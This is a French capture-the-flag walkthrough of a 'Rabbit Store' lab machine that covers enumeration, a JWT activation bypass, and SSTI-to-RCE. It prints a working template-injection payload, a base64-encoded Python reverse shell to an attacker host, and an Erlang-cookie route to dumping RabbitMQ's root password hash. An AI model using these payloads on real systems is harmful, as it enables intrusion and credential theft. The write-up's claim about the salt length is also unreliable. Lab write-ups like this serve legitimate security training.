---
title: Rabbit Store
weight: 1
---
<center>
    <img src="../img/rabbit_store.png" width="20%" />
</center>

# Rabbit Store

## Première connexion

### Enumération 

```bash
nmap -sS -T5 -sV -p- 10.82.170.228 
Starting Nmap 7.80 ( https://nmap.org ) at 2026-01-15 21:03 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for rabbit.thm (10.82.170.228)
Host is up (0.00014s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.52
4369/tcp  open  epmd    Erlang Port Mapper Daemon
25672/tcp open  unknown
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 136.89 seconds
```
Le scan nmap nous donne plusieurs ports dont le port 80. en se connectant à l'application on observe deux nom de domaines : 
- cloudsite.thm
- storage.cloudsite.thm

On peut s'inscrire au site mais à la connexion on a un message disant que nous notre souscription n'est pas active. 

### Contournement de l'activation


Le token d'authentification est un token jwt qui une fois décodé nous donne : 

```json
{
  "alg": "HS256",
  "typ": "JWT"
}.{
  "email": "admin2@cloudsite.thm",
  "subscription": "inactive",
  "iat": 1759948859,
  "exp": 1759952459
}
```

On peut donc essayer de surcharger le paramètre subscription. Si on modifie le jwt, on s'aperçoit que : 
- la signature est bien vérifiée. 
- l'exploitation via changement de l'algorithme de chiffrement n'est pas possible. 

On peut donc voir si une `Server Side Parameter Pollution` n'est pas possible. 

![alt text](../img/rabbitstore_server-side-parameter-pollution.png)

Cela fonctionne et on se retrouve connecté à l'application. 

## Exploitation des fonctionnalités d'Upload

On arrive sur une nouvelle page nous donnant deux fonctionnalités : 
- Un upload de fichier, qui n'est manifestement pas faillible : on ne peut pas exécuter les fichiers uploadé. 
- Une fonction permettant de télécharger des fichiers à une certaine URL. 

En essayant des ports communs de backend (3000,5000,8080,8000,etc...) on s'aperçoit qu'il y a une API disponible sur le port 3000 : 

![apidoc](../img/rabbitstore_apidoc.png)

### SSTI : Server Side Template Injection

L'api `api/fetch-messeges-from-chatbot` nous demande un nom d'utilisateur qu'elle nous renvoit par la suite. On peut donc tenter une SSTI et cela fonctionne : 

![ssti](../img/rabbitstore_ssti.png)

### SSTI vers RCE

On peut alors exécuter le payload suivant pour exécuter des commandes côté serveur :

```
POST /api/fetch_messeges_from_chatbot HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://storage.cloudsite.thm/dashboard/active
Content-Type: application/json
Content-Length: 103
Origin: http://storage.cloudsite.thm
Connection: keep-alive
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFAYS5hIiwic3Vic2NyaXB0aW9uIjoiYWN0aXZlIiwiaWF0IjoxNzY4NTE2MDY0LCJleHAiOjE3Njg1MTk2NjR9.LiyHEaU8rfVw4X5-knBO69esRtXR8P69uM5fei7DqXo
Priority: u=0

{"username":"{{request.application.__globals__.__builtins__.__import__('os').popen('ls /').read()}}"
}
```

On obtient un reverse shell en encodant un payload en base64 et en l'executant. (l'encodage en base64 n'est pas obligatoire mais permet d'éviter les échappements)

```json
    {
        "username":"{{request.application.__globals__.__builtins__.__import__('os').popen('eval $(echo ZXhwb3J0IFJIT1NUPSIxMC44Mi45NC4xNDAiO2V4cG9ydCBSUE9SVD04ODg4O3B5dGhvbjMgLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oImJhc2giKSc | base64 -d)').read()}}"
    }
```

On a donc un shell avec azrael. 


### RCE avec le cookie Erlang

Pendant l'énumération, on trouve un cookie Erlang dans /var/lib/rabbitmq. Ce cookie peut nous permettre d'avoir un shell en utilisant un exploit metasploit : [Erlang Cookie RCE](https://www.rapid7.com/db/modules/exploit/multi/misc/erlang_cookie_rce/) 

### Récupération du mot de passe Root

Dans la base Mnesia, on trouve le fichier rabbitmq_user.dtd qui contient : 


```plain
cXMIbWLAhd
log_headerddcd_logk1.0k4.16.2drabbit@forgehb¹b\2b\«êbWLAhd
internal_usermThe password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.m$¿'øªò¥(N5×:Å?ù¬º¾Ûp6Fë¡
×I27~
jdrabbit_password_hashing_sha256|bWLAhd
internal_usermrootm$ã×º)]¢a}ö÷æc'ÿ/»\C³öìaHíO5ld
administratorjdrabbit_password_hashing_sha256
```

On apprend donc où trouver le mot de passe de root. Nous allons donc essayer de retrouver le hash de l'utilisateur root de rabbitmq en utilisant le cookie erlang que nous avions déjà utilisé : 

```bash
rabbitmq@forge:~$ chmod 700 .erlang.rabbitmq # Pour éviter les messages d'erreur 
rabbitmq@forge:~$ export RABBITMQ_ERLANG_COOKIE=5O43voXpK0024PXu # Pour utiliser directement le cookie sans avoir à le spécifier dans la ligne de commande 
rabbitmq@forge:~$ rabbitmqctl list_users
rabbitmqctl list_users
RABBITMQ_ERLANG_COOKIE env variable support is deprecated and will be REMOVED in a future version. Use the $HOME/.erlang.cookie file or the --erlang-cookie switch instead.
Listing users ...
user	tags
The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.	[]
root	[administrator]

rabbitmq@forge:~$ rabbitmqctl eval 'rabbit_auth_backend_internal:lookup_user(<<"root">>).'
<bit_auth_backend_internal:lookup_user(<<"root">>).'
{ok,{internal_user,<<"root">>,
<<227,215,186,133,41,93,29,22,162,.....................,72,17,237,25,79,152,7,53,133>>,
[administrator],
rabbit_password_hashing_sha256}}
```

On a donc la représentation décimale de notre hash sha256 dont la représentation hexadécimale est : 

```
e3d7ba85295d1d16a2617df6f——————c614811ed194f98073585
```

Si on se fit à la documentation de rabbitmq, les 32 premiers bytes sont le salt utilisé dans le hash du mot de passe. Donc le hash du mot de passe est : 

```
295d1d16a2617df6f——————c614811ed194f98073585
```